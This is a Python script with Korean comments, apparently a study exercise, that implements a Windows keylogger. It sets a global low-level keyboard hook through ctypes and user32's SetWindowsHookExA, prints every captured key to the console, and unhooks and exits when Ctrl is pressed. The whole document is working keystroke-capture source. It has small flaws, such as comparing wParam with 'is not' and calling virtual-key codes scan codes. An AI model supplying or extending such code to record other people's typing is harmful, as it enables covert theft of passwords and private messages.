
# import [모듈/속성명]으로 모듈과 속성을 로드함
import sys
from ctypes import * #ctypes가 stdcall 호출 규칙 지원
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

# windll이라고 바로 객체의 dll 바이너리를 로드하는게 가능
user32 = windll.user32

kernel32 = windll.kernel32
# other ## from ctypes._endian import windll
# ##       kernel32 = windll.LoadLibrary("kernel32.dll")


# 상수 선언
WH_KEYBOARD_LL=13 # 전역 키보드 후커
WM_KEYDOWN=0x0100 # 0x100(키보드 누름 스캔 코드)
CTRL_CODE = 162 # 162 (CTRL 스캔 코드)

# 키보드 후킹을 위한 키로거 클래스 선언
class keyLogger:
    def __init__(self): # 초기 메소드
        self.lUser32 = user32 # 클래스에서 쓸 lUser32 멤버 선언
        self.hooked = None # 후킹 여부 (후킹되지 않음; 초기치)
    
    # 후커 설치 멤버 함수
    def installHookProc(self, pointer):
        # WIN32 API중 user32.dll::SetWindowsHookExA()를 호출해서 키보드 
        # 후커 설치. pointer는 함수 포인터임
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleA(None), # 후킹을 설정할 스레드 설정(None=글로벌, other=특정 로컬 스레드)
            0
        )
        # 후킹이 되지 않으면 False(안됨 리턴), 되면 True(되었음)
        if not self.hooked:
            return False
        return True

    # 후커 언인스톨러 함수
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        # user32.dll::UnhookWindowsHookEx()로 후킹 지움
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None
        
# CFUNCTYPE()으로 콜 백 함수 포인터를 선언해서 CMPFUNC로 함수를 호출하는 getFPTR() 함수
def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn) # CMPFUNC 메소드로 fn 함수 주소 구해서 반환
    
# 후킹 프로시저 함수
def hookProc(nCode, wParam, lParam):
    # WM_KEYDOWN(키보드 입력)이 없을 땐 다음 키로거 후커로 계속 이동
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0]) # 키보드가 입력 되었을 때, lParam[0] 메시지를 문자로 전환해 받음
    print(hookedKey) # 후킹한 키 값 출력
    if(CTRL_CODE == int(lParam[0])): # CTRL_CODE가 입력되면 후커 제거후 파이썬 종료
        print("Ctrl pressed, call uninstallHook")
        keyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)

# 키로그 클래스 인스턴스 선언
keyLogger = keyLogger()

# pointer 함수 포인터에 getFPTR(hookProc)로 후킹 프로시저 함수 포인터 로딩
pointer = getFPTR(hookProc)

# 키로거 클래스의 installHookPorc(pointer)로 키로거 후커 설치
if keyLogger.installHookProc(pointer):
    print("installed keyLogger")

# 첫 메시지를 하나 받는 것으로 키로그를 시작하는 함수 호출
# 설치한 hookProc 후커 함수에 의해 지속적으로 print 함수를 통해서
# 키로깅된 문자 출력 되는 것임.
startKeyLog()
